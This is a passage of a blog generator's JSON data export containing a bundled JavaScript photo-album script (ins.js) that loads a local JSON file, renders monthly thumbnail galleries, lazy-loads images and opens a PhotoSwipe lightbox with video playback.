data[i].text;\n        var key = y + \"\" + ((m + \"\").length == 1 ? \"0\" + m : m);\n        if (imgObj[key]) {\n          imgObj[key].srclist.push(src);\n          imgObj[key].text.push(text);\n        } else {\n          imgObj[key] = {\n            year: y,\n            month: m,\n            srclist: [src],\n            text: [text]\n          };\n        }\n      }\n      render(imgObj);\n    };\n\n    function loadData(success) {\n      if (!searchData) {\n        var xhr = new XMLHttpRequest();\n        xhr.open('GET', './ins.json?t=' + +new Date(), true);\n\n        xhr.onload = function() {\n          if (this.status >= 200 && this.status < 300) {\n            var res = JSON.parse(this.response);\n            searchData = res;\n            success(searchData);\n          } else {\n            console.error(this.statusText);\n          }\n        };\n\n        xhr.onerror = function() {\n          console.error(this.statusText);\n        };\n\n        xhr.send();\n      } else {\n        success(searchData);\n      }\n    }\n\n    var Ins = {\n      init: function init() {\n        loadData(function(data) {\n          render(data);\n        });\n      }\n    };\n\n    Ins.init();\n\n    // export default impush;\n\n    /***/\n  },\n  /* 1 */\n  /***/\n  function(module, exports, __webpack_require__) {\n\n    /* WEBPACK VAR INJECTION */\n    (function(global) {\n      'use strict';\n\n      var inViewport = __webpack_require__(3);\n      var lazyAttrs = ['data-src'];\n\n      global.lzld = lazyload();\n\n      // Provide libs using getAttribute early to get the good src\n      // and not the fake data-src\n      replaceGetAttribute('Image');\n      replaceGetAttribute('IFrame');\n\n      function registerLazyAttr(attr) {\n        if (indexOf.call(lazyAttrs, attr) === -1) {\n          lazyAttrs.push(attr);\n        }\n      }\n\n      function lazyload(opts) {\n        opts = merge({\n          'offset': 333,\n          'src': 'data-src',\n          'container': false\n        }, opts || {});\n\n        if (typeof opts.src === 'string') {\n          registerLazyAttr(opts.src);\n        }\n\n        var elts = [];\n\n        function show(elt) {\n          var src = findRealSrc(elt);\n\n          if (src) {\n            elt.src = src;\n          }\n\n          elt.setAttribute('data-lzled', true);\n          elts[indexOf.call(elts, elt)] = null;\n        }\n\n        function findRealSrc(elt) {\n          if (typeof opts.src === 'function') {\n            return opts.src(elt);\n          }\n\n          return elt.getAttribute(opts.src);\n        }\n\n        function register(elt) {\n          elt.onload = null;\n          elt.removeAttribute('onload');\n          elt.onerror = null;\n          elt.removeAttribute('onerror');\n\n          if (indexOf.call(elts, elt) === -1) {\n            inViewport(elt, opts, show);\n          }\n        }\n\n        return register;\n      }\n\n      function replaceGetAttribute(elementName) {\n        var fullname = 'HTML' + elementName + 'Element';\n        if (fullname in global === false) {\n          return;\n        }\n\n        var original = global[fullname].prototype.getAttribute;\n        global[fullname].prototype.getAttribute = function(name) {\n          if (name === 'src') {\n            var realSrc;\n            for (var i = 0, max = lazyAttrs.length; i < max; i++) {\n              realSrc = original.call(this, lazyAttrs[i]);\n              if (realSrc) {\n                break;\n              }\n            }\n\n            return realSrc || original.call(this, name);\n          }\n\n          // our own lazyloader will go through theses lines\n          // because we use getAttribute(opts.src)\n          return original.call(this, name);\n        };\n      }\n\n      function merge(defaults, opts) {\n        for (var name in defaults) {\n          if (opts[name] === undefined) {\n            opts[name] = defaults[name];\n          }\n        }\n\n        return opts;\n      }\n\n      // http://webreflection.blogspot.fr/2011/06/partial-polyfills.html\n      function indexOf(value) {\n        for (var i = this.length; i-- && this[i] !== value;) {}\n        return i;\n      }\n\n      module.exports = lazyload;\n\n      // export default impush;\n      /* WEBPACK VAR INJECTION */\n    }.call(exports, (function() {\n      return this;\n    }())))\n\n    /***/\n  },\n  /* 2 */\n  /***/\n  function(module, exports) {\n\n    'use strict';\n\n    var initPhotoSwipeFromDOM = function initPhotoSwipeFromDOM(gallerySelector) {\n\n      // parse slide data (url, title, size ...) from DOM elements \n      // (children of gallerySelector)\n      var parseThumbnailElements = function parseThumbnailElements(el) {\n        el = el.parentNode.parentNode;\n        var thumbElements = el.getElementsByClassName('thumb'),\n          numNodes = thumbElements.length,\n          items = [],\n          figureEl,\n          linkEl,\n          size,\n          type,\n          // video or not\n          target,\n          item;\n\n        for (var i = 0; i < numNodes; i++) {\n\n          figureEl = thumbElements[i]; // \n\n          // include only element nodes \n          if (figureEl.nodeType !== 1) {\n            continue;\n          }\n\n          linkEl = figureEl.children[0]; // \n\n          size = linkEl.getAttribute('data-size').split('x');\n          type = linkEl.getAttribute('data-type');\n          target = linkEl.getAttribute('data-target');\n          // create slide object\n          item = {\n            src: linkEl.getAttribute('href'),\n            w: parseInt(size[0], 10),\n            h: parseInt(size[1], 10)\n          };\n\n          if (figureEl.children.length > 1) {\n            item.title = figureEl.children[1].innerHTML;\n          }\n\n          if (linkEl.children.length > 0) {\n            item.msrc = linkEl.children[0].getAttribute('src');\n            item.type = type;\n            item.target = target;\n            item.html = '<video src=\"' + target + '\" controls=\"controls\" autoplay=\"autoplay\"></video>';\n            if (type === 'video') {\n              //item.src = null;\n            }\n          }\n\n          item.el = figureEl; // save link to element for getThumbBoundsFn\n          items.push(item);\n        }\n\n        return items;\n      };\n\n      // find nearest parent element\n      var closest = function closest(el, fn) {\n        return el && (fn(el) ? el : closest(el.parentNode, fn));\n      };\n\n      // triggers when user clicks on thumbnail\n      var onThumbnailsClick = function onThumbnailsClick(e) {\n        e = e || window.event;\n        e.preventDefault ? e.preventDefault() : e.returnValue = false;\n\n        var eTarget = e.target || e.srcElement;\n\n        // find root element of slide\n        var clickedListItem = closest(eTarget, function(el) {\n          return el.tagName && el.tagName.toUpperCase() === 'FIGURE';\n        });\n\n        if (!clickedListItem) {\n          return;\n        }\n\n        // find index of clicked item by looping through all child nodes\n        // alternatively, you may define index via data- attribute\n        var clickedGallery = clickedListItem.parentNode,\n\n          // childNodes = clickedListItem.parentNode.childNodes,\n          // numChildNodes = childNodes.length,\n          childNodes = document.getElementsByClassName('thumb'),\n          numChildNodes = childNodes.length,\n          nodeIndex = 0,\n          index;\n\n        for (var i = 0; i < numChildNodes; i++) {\n          if (childNodes[i].nodeType !== 1) {\n            continue;\n          }\n\n          if (childNodes[i] === clickedListItem) {\n            index = nodeIndex;\n            break;\n          }\n          nodeIndex++;\n        }\n\n        if (index >= 0) {\n          // open PhotoSwipe if valid index found\n          openPhotoSwipe(index, clickedGallery);\n        }\n        return false;\n      };\n\n      // parse picture index and gallery index from URL (#&pid=1&gid=2)\n      var photoswipeParseHash = function photoswipeParseHash() {\n        var hash = window.location.hash.substring(1),\n          params = {};\n\n        if (hash.length < 5) {\n          return params;\n        }\n\n        var vars = hash.split('&');\n        for (var i = 0; i < vars.length; i++) {\n          if (!vars[i]) {\n            continue;\n          }\n          var pair = vars[i].split('=');\n          if (pair.length < 2) {\n            continue;\n          }\n          params[pair[0]] = pair[1];\n        }\n\n        if (params.gid) {\n          params.gid = parseInt(params.gid, 10);\n        }\n\n        return params;\n      };\n\n      var openPhotoSwipe = function openPhotoSwipe(index, galleryElement, disableAnimation, fromURL) {\n        var pswpElement = document.querySelectorAll('.pswp')[0],\n          gallery,\n          options,\n          items;\n\n        items = parseThumbnailElements(galleryElement);\n        // define options (if needed)\n        options = {\n\n          // define gallery index (for URL)\n          galleryUID: galleryElement.getAttribute('data-pswp-uid'),\n\n          getThumbBoundsFn: function getThumbBoundsFn(index) {\n            // See Options -> getThumbBoundsFn section of documentation for more info\n            var thumbnail = items[index].el.getElementsByTagName('img')[0],\n              // find thumbnail\n              pageYScroll = window.pageYOffset || document.documentElement.scrollTop,\n              rect = thumbnail.getBoundingClientRect();\n\n            return {\n              x: rect.left,\n              y: rect.top + pageYScroll,\n              w: rect.width\n            };\n          }\n\n        };\n\n        // PhotoSwipe opened from URL\n        if (fromURL) {\n          if (options.galleryPIDs) {\n            // parse real index when custom PIDs are used \n            // http://photoswipe.com/documentation/faq.html#custom-pid-in-url\n            for (var j = 0; j < items.length; j++) {\n              if (items[j].pid == index) {\n                options.index = j;\n                break;\n              }\n            }\n          } else {\n            // in URL indexes start from 1\n            options.index = parseInt(index, 10) - 1;\n          }\n        } else {\n          options.index = parseInt(index, 10);\n        }\n\n        // exit if index not found\n        if (isNaN(options.index)) {\n          return;\n        }\n\n        if (disableAnimation) {\n          options.showAnimationDuration = 0;\n        }\n\n        // Pass data to PhotoSwipe and initialize it\n        gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, options);\n        gallery.init();\n\n        var $tempVideo;\n        var stopVideoHandle = function stopVideoHandle() {\n          if ($tempVideo) {\n            $tempVideo.remove();\n            $tempVideo = null;\n          }\n        };\n        var changeHandle = function changeHandle() {\n          var item = gallery.currItem;\n          stopVideoHandle();\n          if (item.type === 'video') {\n            var $ctn = item.container;\n            var style = $ctn.getElementsByClassName('pswp__img')[0].style;\n            var $video = document.createElement('video');\n            $video.setAttribute('autoplay', 'autoplay');\n            $video.setAttribute('controls', 'controls');\n            $video.setAttribute('src', item.target);\n            $video.style.width = style.width;\n            $video.style.height = style.height;\n            $video.style.position = 'absolute';\n            $video.style.zIndex = 2;\n            $tempVideo = $video;\n            $ctn.appendChild($video);\n          }\n        };\n        gallery.listen('initialZoomIn', changeHandle);\n        gallery.listen('afterChange', changeHandle);\n        gallery.listen('initialZoomOut', stopVideoHandle);\n      };\n\n      // loop through all gallery elements and bind events\n      var galleryElements = document.querySelectorAll(gallerySelector);\n      for (var i = 0, l = galleryElements.length; i < l; i++) {\n        galleryElements[i].setAttribute('data-pswp-uid', i + 1);\n        galleryElements[i].onclick = onThumbnailsClick;\n      }\n\n      // Parse URL and open gallery if it contains #&pid=3&gid=1\n      var hashData = photoswipeParseHash();\n      if (hashData.pid && hashData.gid) {\n        openPhotoSwipe(hashData.pid, galleryElements[hashData.gid - 1], true, true);\n      }\n    };\n\n    var Viewer = function() {\n      function init() {\n        initPhotoSwipeFromDOM('.photos');\n      }\n      return {\n        init: init\n      };\n    }();\n\n    module.exports = Viewer;\n\n    /***/\n  },\n  /* 3 */\n  /***/\n  function(module, exports) {\n\n    /* WEBPACK VAR INJECTION */\n    (function(global) {\n      module.exports = inViewport;\n\n      var instances = [];\n      var supportsMutationObserver = typeof global.MutationObserver === 'function';\n\n      function inViewport(elt, params, cb) {\n        var opts = {\n          container: global.document.body,\n          offset: 0\n        };\n\n        if (params === undefined || typeof params === 'function') {\n          cb = params;\n          params = {};\n        }\n\n        var container = opts.container = params.container || opts.container;\n        var offset = opts.offset = params.offset || opts.offset;\n\n        for (var i = 0; i < instances.length; i++) {\n          if (instances[i].container === container) {\n            return instances[i].isInViewport(elt, offset, cb);\n          }\n        }\n\n        return instances[\n          instances.push(createInViewport(container)) - 1\n        ].isInViewport(elt, offset, cb);\n      }\n\n      function addEvent(el, type, fn) {\n        if (el.attachEvent) {\n          el.attachEvent('on' + type, fn);\n        } else {\n          el.addEventListener(type, fn, false);\n        }\n      }\n\n      function debounce(func, wait, immediate) {\n        var timeout;\n        return function() {\n          var context = this,\n            args = arguments;\n          var callNow = immediate && !timeout;\n          clearTimeout(timeout);\n          timeout = setTimeout(later, wait);\n          if (callNow) func.apply(context, args);\n\n          function later() {\n            timeout = null;\n            if (!immediate) func.apply(context, args);\n          }\n        };\n      }\n\n      // https://github.com/jquery/sizzle/blob/3136f48b90e3edc84cbaaa6f6f7734ef03775a07/sizzle.js#L708\n      var contains = function() {\n        if (!global.document) {\n          return true;\n        }\n        return global.document.documentElement.compareDocumentPosition ?\n          function(a, b) {\n            return !!(a.compareDocumentPosition(b) & 16);\n          } :\n          global.document.documentElement.contains ?\n          function(a, b) {\n            return a !== b && (a.contains ? a.contains(b) : false);\n          } :\n          function(a, b) {\n            while (b = b.parentNode) {\n              if (b === a) {\n                return true;\n              }\n            }\n            return false;\n          };\n      }\n\n      function createInViewport(container) {\n        var watches = createWatches();\n\n        var scrollContainer = container === global.document.body ? global : container;\n        var debouncedCheck = debounce(watches.checkAll(watchInViewport), 15);\n\n        addEvent(scrollContainer, 'scroll', debouncedCheck);\n\n        if (scrollContainer === global) {\n          addEvent(global, 'resize', debouncedCheck);\n        }\n\n        if (supportsMutationObserver) {\n          observeDOM(watches, container, debouncedCheck);\n        }\n\n        // failsafe check, every 200ms we check for visible images\n        // usecase: a hidden parent containing eleements\n        // when the parent becomes visible, we have no event that the children\n        // became visible\n        setInterval(debouncedCheck, 150);\n\n        function isInViewport(elt, offset, cb) {\n          if (!cb) {\n            return isVisible(elt, offset);\n          }\n\n          var remote = createRemote(elt, offset, cb);\n          remote.watch();\n          return remote;\n        }\n\n        function createRemote(elt, offset, cb) {\n          function watch() {\n            watches.add(elt, offset, cb);\n          }\n\n          function dispose() {\n            watches.remove(elt);\n          }\n\n          return {\n            watch: watch,\n            dispose: dispose\n          };\n        }\n\n        function watchInViewport(elt, offset, cb) {\n          if (isVisible(elt, offset)) {\n            watches.remove(elt);\n            cb(elt);\n          }\n        }\n\n        function isVisible(elt, offset) {\n          if (!contains(global.document.documentElement, elt) || !contains(global.document.documentElement, container)) {\n            return false;\n          }\n\n          // Check if the element is visible\n          // https://github.com/jquery/jquery/blob/740e190223d19a114d5373758127285d14d6b71e/src/css/hiddenVisibleSelectors.js\n          if (!elt.offsetWidth || !elt.offsetHeight) {\n            return false;\n          }\n\n          var eltRect = elt.getBoundingClientRect();\n          var viewport = {};\n\n          if (container === global.document.body) {\n            viewport = {\n              top: -offset,\n              left: -offset,\n              right: global.document.documentElement.clientWidth + offset,\n              bottom: global.document.documentElement.clientHeight + offset\n            };\n          } else {\n            var containerRect = container.getBoundingClientRect();\n            viewport = {\n              top: containerRect.top - offset,\n              left: containerRect.left - offset,\n              right: containerRect.right + offset,\n              bottom: containerRect.bottom + offset\n            };\n          }\n\n          // The element must overlap with the visible part of the viewport\n          var visible =\n            (\n              (eltRect.right > viewport.left) &&\n              (eltRect.left < viewport.right) &&\n              (eltRect.bottom > viewport.top) &&\n              (eltRect.top < viewport.bottom)\n            );\n\n          return visible;\n        }\n\n        return {\n          container: container,\n          isInViewport: isInViewport\n        };\n      }\n\n      function createWatches() {\n        var watches = [];\n\n        function add(elt, offset, cb) {\n          if (!isWatched(elt)) {\n            watches.push([elt, offset, cb]);\n          }\n        }\n\n        function remove(elt) {\n          var pos = indexOf(elt);\n          if (pos !== -1) {\n            watches.splice(pos, 1);\n          }\n        }\n\n        function indexOf(elt) {\n          for (var i = watches.length - 1; i >= 0; i--) {\n            if (watches[i][0] === elt) {\n              return i;\n            }\n          }\n          return -1;\n        }\n\n        function isWatched(elt) {\n          return indexOf(elt) !== -1;\n        }\n\n        function checkAll(cb) {\n          return function() {\n            for (var i = watches.length - 1; i >= 0; i--) {\n              cb.apply(this, watches[i]);\n            }\n          };\n        }\n\n        return {\n          add: add,\n          remove: remove,\n          isWatched: isWatched,\n          checkAll: checkAll\n        };\n      }\n\n      function observeDOM(watches, container, cb) {\n        var observer = new MutationObserver(watch);\n        var filter = Array.prototype.filter;\n        var concat = Array.prototype.concat;\n\n        observer.observe(container, {\n          childList: true,\n          subtree: true,\n          // changes like style/width/height/display will be catched\n          attributes: true\n        });\n\n        function watch(mutations) {\n          // some new DOM nodes where previously watched\n          // we should check their positions\n          if (mutations.some(knownNodes) === true) {\n            setTimeout(cb, 0);\n          }\n        }\n\n        function knownNodes(mutation) {\n          var nodes = concat.call([],\n            Array.prototype.slice.call(mutation.addedNodes),\n            mutation.target\n          );\n          return filter.call(nodes, watches.isWatched).length > 0;\n        }\n      }\n\n      /* WEBPACK VAR INJECTION */\n    }.call(exports, (function() {\n      return this;\n    }())))\n\n    /***/\n  }\n  /******/\n]);","date":"2020-11-12T09:29:54.664Z","updated":"2020-10-28T10:23:34.744Z","path":"photos/ins.js","layout":"false","title":"","comments":1,"_id":"ckrlq5rcq0006q0sz5zb8zd9n","content":"/******/\n(function(modules) { // webpackBootstrap\n  /******/ // The module cache\n  /******/\n  var installedModules = {};\n  /******/\n  /******/ // The require function\n  /******/\n  function __webpack_require__(moduleId) {\n    /******/\n    /******/ // Check if module is in cache\n    /******/\n    if (installedModules[moduleId])\n    /******/\n      return installedModules[moduleId].exports;\n    /******/\n    /******/ // Create a new module (and put it into the cache)\n    /******/\n    var module = installedModules[moduleId] = {\n      /******/\n      exports: {},\n      /******/\n      id: moduleId,\n      /******/\n      loaded: false\n        /******/\n    };\n    /******/\n    /******/ // Execute the module function\n    /******/\n    modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n    /******/\n    /******/ // Flag the module as loaded\n    /******/\n    module.loaded = true;\n    /******/\n    /******/ // Return the exports of the module\n    /******/\n    return module.exports;\n    /******/\n  }\n  /******/\n  /******/\n  /******/ // expose the modules object (__webpack_modules__)\n  /******/\n  __webpack_require__.m = modules;\n  /******/\n  /******/ // expose the module cache\n  /******/\n  __webpack_require__.c = installedModules;\n  /******/\n  /******/ // __webpack_public_path__\n  /******/\n  __webpack_require__.p = \"/dist/\";\n  /******/\n  /******/ // Load entry module and return exports\n  /******/\n  return __webpack_require__(0);\n  /******/\n})\n/************************************************************************/\n/******/\n([\n  /* 0 */\n  /***/\n  function(module, exports, __webpack_require__) {\n\n    'use strict';\n\n    __webpack_require__(1);\n\n    var _view = __webpack_require__(2);\n\n    var _view2 = _interopRequireDefault(_view);\n\n    function _interopRequireDefault(obj) {\n      return obj && obj.__esModule ? obj : {\n        default: obj\n      };\n    }\n\n    /**\n     * @name impush-client \n     * @description 这个项目让我发家致富…\n     * @date 2016-12-1\n     */\n\n    var _collection = [];\n    var _count = 0;\n    var searchData;\n\n    function addMask(elem) {\n      var rect = elem.getBoundingClientRect();\n      var style = getComputedStyle(elem, null);\n\n      var mask = document.createElement('i');\n      mask.className = 'icon-film';\n      mask.style.color = '#fff';\n      mask.style.fontSize = '26px';\n      mask.style.position = 'absolute';\n      mask.style.right = '10px';\n      mask.style.bottom = '10px';\n      mask.style.zIndex = 1;\n      elem.parentNode.appendChild(mask);\n    }\n\n    var createVideoIncon = function createVideoIncon() {\n      var $videoImg = document.querySelectorAll('.thumb a[data-type=\"video\"]');\n      for (var i = 0, len = $videoImg.length; i < len; i++) {\n        addMask($videoImg[i]);\n      }\n    };\n    var render = function render(res) {\n      var ulTmpl = \"\";\n      for (var j = 0, len2 = res.list.length; j < len2; j++) {\n        var data = res.list[j].arr;\n        var liTmpl = \"\";\n        for (var i = 0, len = data.link.length; i < len; i++) {\n          var minSrc = './minins/' + data.link[i] + '.min.jpg';\n          var src = './ins/' + data.link[i];\n          var type = 'images';\n\t\t  var sizes = data.sizes[i];\n\t\t  src += '.jpg';\n          var target = src;\n\n          liTmpl += '<figure class=\"thumb\" itemprop=\"associatedMedia\" itemscope=\"\">\\\n                <a href=\"' + src + '\" data-size=\"' + sizes + '\" data-type=\"' + type + '\" data-target=\"' + target + '\">\\\n                  <img class=\"reward-img\" data-type=\"' + type + '\" src=\"' + minSrc + '\" itemprop=\"thumbnail\" onload=\"lzld(this)\">\\\n                </a>\\\n                <figcaption style=\"display:none\" itemprop=\"caption description\">' + data.text[i] + '</figcaption>\\\n            </figure>';\n        }\n        ulTmpl = ulTmpl + '<section class=\"archives album\"><h1 class=\"year\">' + data.year + '<em>' + data.month + '月</em></h1>\\\n        <ul class=\"img-box-ul\">' + liTmpl + '</ul>\\\n        </section>';\n      }\n      document.querySelector('.instagram').innerHTML = '<div class=\"photos\" itemscope=\"\">' + ulTmpl + '</div>';\n      createVideoIncon();\n      _view2.default.init();\n    };\n\n    var replacer = function replacer(str) {\n      var arr = str.split(\"/\");\n      return \"/assets/ins/\" + arr[arr.length - 1];\n    };\n\n    var ctrler = function ctrler(data) {\n      var imgObj = {};\n      for (var i = 0, len = data.length; i < len; i++) {\n        var y = data[i].y;\n        var m = data[i].m;\n        var src = replacer(data[i].src);\n        var text = data[i].text;\n        var key = y + \"\" + ((m + \"\").length == 1 ? \"0\" + m : m);\n        if (imgObj[key]) {\n          imgObj[key].srclist.push(src);\n          imgObj[key].text.push(text);\n        } else {\n          imgObj[key] = {\n            year: y,\n            month: m,\n            srclist: [src],\n            text: [text]\n          };\n        }\n      }\n      render(imgObj);\n    };\n\n    function loadData(success) {\n      if (!searchData) {\n        var xhr = new XMLHttpRequest();\n        xhr.open('GET', './ins.json?t=' + +new Date(), true);\n\n        xhr.onload = function() {\n          if (this.status >= 200 && this.status < 300) {\n            var res = JSON.parse(this.response);\n            searchData = res;\n            success(searchData);\n          } else {\n            console.error(this.statusText);\n          }\n        };\n\n        xhr.onerror = function() {\n          console.error(this.statusText);\n        };\n\n        xhr.send();\n      } else {\n        success(searchData);\n      }\n    }\n\n    var Ins = {\n      init: function init() {\n        loadData(function(data) {\n          render(data);\n        });\n      }\n    };\n\n    Ins.init();\n\n    // export default impush;\n\n    /***/\n  },\n  /* 1 */\n  /***/\n  function(module, exports, __webpack_require__) {\n\n    /* WEBPACK VAR INJECTION */\n    (function(global) {\n      'use strict';\n\n      var inViewport = __webpack_require__(3);\n      var lazyAttrs = ['data-src'];\n\n      global.lzld = lazyload();\n\n      // Provide libs using getAttribute early to get the good src\n      // and not the fake data-src\n      replaceGetAttribute('Image');\n      replaceGetAttribute('IFrame');\n\n      function registerLazyAttr(attr) {\n        if (indexOf.call(lazyAttrs, attr) === -1) {\n          lazyAttrs.push(attr);\n        }\n      }\n\n      function lazyload(opts) {\n        opts = merge({\n          'offset': 333,\n          'src': 'data-src',\n          'container': false\n        }, opts || {});\n\n        if (typeof opts.src === 'string') {\n          registerLazyAttr(opts.src);\n        }\n\n        var elts = [];\n\n        function show(elt) {\n          var src = findRealSrc(elt);\n\n          if (src) {\n            elt.src = src;\n          }\n\n          elt.setAttribute('data-lzled', true);\n          elts[indexOf.call(elts, elt)] = null;\n        }\n\n        function findRealSrc(elt) {\n          if (typeof opts.src === 'function') {\n            return opts.src(elt);\n          }\n\n          return elt.getAttribute(opts.src);\n        }\n\n        function register(elt) {\n          elt.onload = null;\n          elt.removeAttribute('onload');\n          elt.onerror = null;\n          elt.removeAttribute('onerror');\n\n          if (indexOf.call(elts, elt) === -1) {\n            inViewport(elt, opts, show);\n          }\n        }\n\n        return register;\n      }\n\n      function replaceGetAttribute(elementName) {\n        var fullname = 'HTML' + elementName + 'Element';\n        if (fullname in global === false) {\n          return;\n        }\n\n        var original = global[fullname].prototype.getAttribute;\n        global[fullname].prototype.getAttribute = function(name) {\n          if (name === 'src') {\n            var realSrc;\n            for (var i = 0, max = lazyAttrs.length; i < max; i++) {\n              realSrc = original.call(this, lazyAttrs[i]);\n              if (realSrc) {\n                break;\n              }\n            }\n\n            return realSrc || original.call(this, name);\n          }\n\n          // our own lazyloader will go through theses lines\n          // because we use getAttribute(opts.src)\n          return original.call(this, name);\n        };\n      }\n\n      function merge(defaults, opts) {\n        for (var name in defaults) {\n          if (opts[name] === undefined) {\n            opts[name] = defaults[name];\n          }\n        }\n\n        return opts;\n      }\n\n      // http://webreflection.blogspot.fr/2011/06/partial-polyfills.html\n      function indexOf(value) {\n        for (var i = this.length; i-- && this[i] !== value;) {}\n        return i;\n      }\n\n      module.exports = lazyload;\n\n      // export default impush;\n      /* WEBPACK VAR INJECTION */\n    }.call(exports, (function() {\n      return this;\n    }())))\n\n    /***/\n  },\n  /* 2 */\n  /***/\n  function(module, exports) {\n\n    'use strict';\n\n    var initPhotoSwipeFromDOM = function initPhotoSwipeFromDOM(gallerySelector) {\n\n      // parse slide data (url, title, size ...) from DOM elements \n      // (children of gallerySelector)\n      var parseThumbnailElements = function parseThumbnailElements(el) {\n        el = el.parentNode.parentNode;\n        var thumbElements = el.getElementsByClassName('thumb'),\n          numNodes = thumbElements.length,\n          items = [],\n          figureEl,\n          linkEl,\n          size,\n          type,\n          // video or not\n          target,\n          item;\n\n        for (var i = 0; i < numNodes; i++) {\n\n          figureEl = thumbElements[i]; // \n\n          // include only element nodes \n          if (figureEl.nodeType !== 1) {\n            continue;\n          }\n\n          linkEl = figureEl.children[0]; // \n\n          size = linkEl.getAttribute('data-size').split('x');\n          type = linkEl.getAttribute('data-type');\n          target = linkEl.getAttribute('data-target');\n          // create slide object\n          item = {\n            src: linkEl.getAttribute('href'),\n            w: parseInt(size[0], 10),\n            h: parseInt(size[1], 10)\n          };\n\n          if (figureEl.children.length > 1) {\n            item.title = figureEl.children[1].innerHTML;\n          }\n\n          if (linkEl.children.length > 0) {\n            item.msrc = linkEl.children[0].getAttribute('src');\n            item.type = type;\n            item.target = target;\n            item.html = '<video src=\"' + target + '\" controls=\"controls\" autoplay=\"autoplay\"></video>';\n            if (type === 'video') {\n              //item.src = null;\n            }\n          }\n\n          item.el = figureEl; // save link to element for getThumbBoundsFn\n          items.push(item);\n        }\n\n        return items;\n      };\n\n      // find nearest parent element\n      var closest = function closest(el, fn) {\n        return el && (fn(el) ? el : closest(el.parentNode, fn));\n      };\n\n      // triggers when user clicks on thumbnail\n      var onThumbnailsClick = function onThumbnailsClick(e) {\n        e = e || window.event;\n        e.preventDefault ? e.preventDefault() : e.returnValue = false;\n\n        var eTarget = e.target || e.srcElement;\n\n        // find root element of slide\n        var clickedListItem = closest(eTarget, function(el) {\n          return el.tagName && el.tagName.toUpperCase() === 'FIGURE';\n        });\n\n        if (!clickedListItem) {\n          return;\n        }\n\n        // find index of clicked item by looping through all child nodes\n        // alternatively, you may define index via data- attribute\n        var clickedGallery = clickedListItem.parentNode,\n\n          // childNodes = clickedListItem.parentNode.childNodes,\n          // numChildNodes = childNodes.length,\n          childNodes = document.getElementsByClassName('thumb'),\n          numChildNodes = childNodes.length,\n          nodeIndex = 0,\n          index;\n\n        for (var i = 0; i < numChildNodes; i++) {\n          if (childNodes[i].nodeType !== 1) {\n            continue;\n          }\n\n          if (childNodes[i] === clickedListItem) {\n            index = nodeIndex;\n            break;\n          }\n          nodeIndex++;\n        }\n\n        if (index >= 0) {\n          // open PhotoSwipe if valid index found\n          openPhotoSwipe(index, clickedGallery);\n        }\n        return false;\n      };\n\n      // parse picture index and gallery index from URL (#&pid=1&gid=2)\n      var photoswipeParseHash = function photoswipeParseHash() {\n        var hash = window.location.hash.substring(1),\n          params = {};\n\n        if (hash.length < 5) {\n          return params;\n        }\n\n        var vars = hash.split('&');\n        for (var i = 0; i < vars.length; i++) {\n          if (!vars[i]) {\n            continue;\n          }\n          var pair = vars[i].split('=');\n          if (pair.length < 2) {\n            continue;\n          }\n          params[pair[0]] = pair[1];\n        }\n\n        if (params.gid) {\n          params.gid = parseInt(params.gid, 10);\n        }\n\n        return params;\n      };\n\n      var openPhotoSwipe = function openPhotoSwipe(index, galleryElement, disableAnimation, fromURL) {\n        var pswpElement = document.querySelectorAll('.pswp')[0],\n          gallery,\n          options,\n          items;\n\n        items = parseThumbnailElements(galleryElement);\n        // define options (if needed)\n        options = {\n\n          // define gallery index (for URL)\n          galleryUID: galleryElement.getAttribute('data-pswp-uid'),\n\n          getThumbBoundsFn: function getThumbBoundsFn(index) {\n            // See Options -> getThumbBoundsFn section of documentation for more info\n            var thumbnail = items[index].el.getElementsByTagName('img')[0],\n              // find thumbnail\n              pageYScroll = window.pageYOffset || document.documentElement.scrollTop,\n              rect = thumbnail.getBoundingClientRect();\n\n            return {\n              x: rect.left,\n              y: rect.top + pageYScroll,\n              w: rect.width\n            };\n          }\n\n        };\n\n        // PhotoSwipe opened from URL\n        if (fromURL) {\n          if (options.galleryPIDs) {\n            // parse real index when custom PIDs are used \n            // http://photoswipe.com/documentation/faq.html#custom-pid-in-url\n            for (var j = 0; j < items.length; j++) {\n              if (items[j].pid == index) {\n                options.index = j;\n                break;\n              }\n            }\n          } else {\n            // in URL indexes start from 1\n            options.index = parseInt(index, 10) - 1;\n          }\n        } else {\n          options.index = parseInt(index, 10);\n        }\n\n        // exit if index not found\n        if (isNaN(options.index)) {\n          return;\n        }\n\n        if (disableAnimation) {\n          options.showAnimationDuration = 0;\n        }\n\n        // Pass data to PhotoSwipe and initialize it\n        gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, options);\n        gallery.init();\n\n        var $tempVideo;\n        var stopVideoHandle = function stopVideoHandle() {\n          if ($tempVideo) {\n            $tempVideo.remove();\n            $tempVideo = null;\n          }\n        };\n        var changeHandle = function changeHandle() {\n          var item = gallery.currItem;\n          stopVideoHandle();\n          if (item.type === 'video') {\n            var $ctn = item.container;\n            var style = $ctn.getElementsByClassName('pswp__img')[0].style;\n            var $video = document.createElement('video');\n            $video.setAttribute('autoplay', 'autoplay');\n            $video.setAttribute('controls', 'controls');\n            $video.setAttribute('src', item.target);\n            $video.style.width = style.width;\n            $video.style.height = style.height;\n            $video.style.position = 'absolute';\n            $video.style.zIndex = 2;\n            $tempVideo = $video;\n            $ctn.appendChild($video);\n          }\n        };\n        gallery.listen('initialZoomIn', changeHandle);\n        gallery.listen('afterChange', changeHandle);\n        gallery.listen('initialZoomOut', stopVideoHandle);\n      };\n\n      // loop through all gallery elements and bind events\n      var galleryElements = document.querySelectorAll(gallerySelector);\n      for (var i = 0, l = galleryElements.length; i < l; i++) {\n        galleryElements[i].setAttribute('data-pswp-uid', i + 1);\n        galleryElements[i].onclick = onThumbnailsClick;\n      }\n\n      // Parse URL and open gallery if it contains #&pid=3&gid=1\n      var hashData = photoswipeParseHash();\n      if (hashData.pid && hashData.gid) {\n        openPhotoSwipe(hashData.pid, galleryElements[hashData.gid - 1], true, true);\n      }\n    };\n\n    var Viewer = function() {\n      function init() {\n        initPhotoSwipeFromDOM('.photos');\n      }\n      return {\n        init: init\n      };\n    }();\n\n    module.exports = Viewer;\n\n    /***/\n  },\n  /* 3 */\n  /***/\n  function(module, exports) {\n\n    /* WEBPACK VAR INJECTION */\n    (function(global) {\n      module.exports = inViewport;\n\n      var instances = [];\n      var supportsMutationObserver = typeof global.MutationObserver === 'function';\n\n      function inViewport(elt, params, cb) {\n        var opts = {\n          container: global.document.body,\n          offset: 0\n        };\n\n        if (params === undefined || typeof params === 'function') {\n          cb = params;\n          params = {};\n        }\n\n        var container = 